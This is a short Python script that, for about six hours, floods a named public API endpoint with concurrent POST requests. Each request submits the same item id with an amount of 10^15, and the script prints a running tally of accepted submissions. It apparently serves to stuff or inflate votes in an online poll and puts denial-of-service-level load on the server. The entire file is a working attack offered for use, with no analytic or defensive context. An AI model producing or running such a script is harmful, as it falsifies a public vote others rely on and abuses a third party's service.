import asyncio, aiohttp, time, os

URL = 'https://api-ryukogo2026.shibadogcap.com/v'
BODY = b'{"i":2974,"a":1000000000000000}'
HDR = {'Content-Type': 'application/json'}
ok = 0
err = 0

async def one(s, sem):
    global ok, err
    async with sem:
        try:
            async with s.post(URL, data=BODY, headers=HDR, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 204: ok += 1
                else: err += 1
        except: err += 1

async def main():
    global ok, err
    sem = asyncio.Semaphore(100)
    conn = aiohttp.TCPConnector(limit=100)
    end = time.time() + 350*60
    async with aiohttp.ClientSession(connector=conn) as s:
        while time.time() < end:
            await asyncio.gather(*[one(s, sem) for _ in range(200)])
            print(f'ok={ok:,} err={err:,} 累積≈{ok*10**15/10**20:.2f}垓', flush=True)

asyncio.run(main())